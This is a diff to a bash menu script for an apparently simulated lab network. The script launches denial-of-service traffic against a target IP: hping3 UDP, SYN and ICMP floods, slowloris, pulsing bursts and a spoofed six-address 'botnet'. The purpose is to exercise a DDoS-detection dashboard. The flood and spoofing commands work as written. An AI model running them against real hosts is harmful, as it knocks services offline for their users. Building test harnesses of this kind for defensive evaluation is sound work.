@@ -33,42 +33,64 @@ show_menu() {
     echo "  [4] High-Rate ICMP Ping Flood       (hping3 --flood --icmp)"
     echo "  [5] Dynamic Pulsing / Wave Attack   (10s ON / 5s OFF bursts)"
     echo "  [6] Coordinated Multi-IP Botnet     (Launches h2, h4-h8 simultaneously)"
-    echo "  [7] Stop All Background Attacks"
-    echo "  [8] Start Legitimate User Stream    (iperf h1 -> h3 @ ~850 pkts/s baseline)"
+    echo "  [7] Stop Attack Traffic             (Halts attacks; retains legitimate stream)"
+    echo "  [8] Stop All Traffic                (Halts attacks AND legitimate traffic)"
+    echo "  [9] Start Legitimate User Stream    (h1 -> h3 @ ~850 pkts/s baseline)"
     echo "  [0] Exit"
     echo ""
-    read -p "Enter choice [0-8]: " choice
+    read -p "Enter choice [0-9]: " choice
+}
+
+ensure_legit_traffic() {
+    if ! pgrep -f "hping3.*5001" >/dev/null 2>&1 && ! pgrep -f "iperf.*10.0.0.3" >/dev/null 2>&1; then
+        echo "[*] [AUTO-START] Bootstrapping background legitimate user stream (10.0.0.1 -> 10.0.0.3 @ ~850 pkts/s)..."
+        sudo hping3 -a 10.0.0.1 --udp -p 5001 -i u1176 $TARGET_IP >/dev/null 2>&1 &
+        sleep 0.3
+    fi
 }
 
 stop_attacks() {
     echo "[*] Terminating all active attack processes..."
+    sudo pkill -f "hping3.*--flood" 2>/dev/null
+    sudo pkill -f "slowloris.py" 2>/dev/null
+    echo "[+] Attack traffic halted. Legitimate user stream remains active."
+}
+
+stop_all() {
+    echo "[*] Terminating all traffic processes..."
     sudo pkill -f "hping3" 2>/dev/null
     sudo pkill -f "slowloris.py" 2>/dev/null
-    echo "[+] All attack traffic halted."
+    sudo pkill -f "iperf -c" 2>/dev/null
+    echo "[+] All traffic halted."
 }
 
 case_launch() {
     case $1 in
         1)
+            ensure_legit_traffic
             echo "[!] Launching Volumetric UDP Flood against $TARGET_IP:80..."
             echo "Press Ctrl+C to abort attack."
             sudo hping3 --flood --udp -p 80 $TARGET_IP
             ;;
         2)
+            ensure_legit_traffic
             echo "[!] Launching TCP SYN Flood against $TARGET_IP:80..."
             echo "Press Ctrl+C to abort attack."
             sudo hping3 --flood -S -p 80 $TARGET_IP
             ;;
         3)
+            ensure_legit_traffic
             echo "[!] Launching Slowloris Low-and-Slow Attack against $TARGET_IP:80..."
             python3 "$SCRIPT_DIR/slowloris.py" $TARGET_IP 80 150
             ;;
         4)
+            ensure_legit_traffic
             echo "[!] Launching ICMP Ping Flood against $TARGET_IP..."
             echo "Press Ctrl+C to abort attack."
             sudo hping3 --flood --icmp $TARGET_IP
             ;;
         5)
+            ensure_legit_traffic
             echo "[!] Launching Dynamic Pulsing Attack against $TARGET_IP (10s flood / 5s pause)..."
             echo "Press Ctrl+C to stop."
             while true; do
@@ -79,6 +101,7 @@ case_launch() {
             done
             ;;
         6)
+            ensure_legit_traffic
             echo "[!] Launching Distributed Botnet Assault across 6 IP addresses..."
             echo "    -> Node h2 (10.0.0.2): Volumetric UDP"
             echo "    -> Node h4 (10.0.0.4): TCP SYN Flood"
@@ -93,9 +116,6 @@ case_launch() {
             sudo hping3 -a 10.0.0.7 --flood --udp -p 8080 $TARGET_IP >/dev/null 2>&1 &
             sudo hping3 -a 10.0.0.8 --flood --udp -p 53 $TARGET_IP >/dev/null 2>&1 &
             python3 "$SCRIPT_DIR/slowloris.py" $TARGET_IP 80 80 >/dev/null 2>&1 &
-
-            # Ensure continuous legitimate traffic from h1 runs in parallel
-            iperf -c $TARGET_IP -u -b 10m -t 3600 >/dev/null 2>&1 &
             
             echo "[+] Distributed Botnet active in background alongside legitimate h1 user traffic!"
             echo "Observe the React Dashboard: All 6 attacker IPs are blocked, while legitimate h1 traffic is forwarded."
@@ -107,8 +127,12 @@ case_launch() {
             read -p "Press Enter to return to menu..."
             ;;
         8)
+            stop_all
+            read -p "Press Enter to return to menu..."
+            ;;
+        9)
             echo "[*] Launching legitimate user stream from h1 to h3 (Server: $TARGET_IP)..."
-            iperf -c $TARGET_IP -u -b 10m -t 3600 >/dev/null 2>&1 &
+            ensure_legit_traffic
             echo "[+] Legitimate user stream (~850 pkts/s) active in background!"
             echo "Inspect the React Dashboard to observe Clean Forwarded traffic green line passing through."
             read -p "Press Enter to return to menu..."
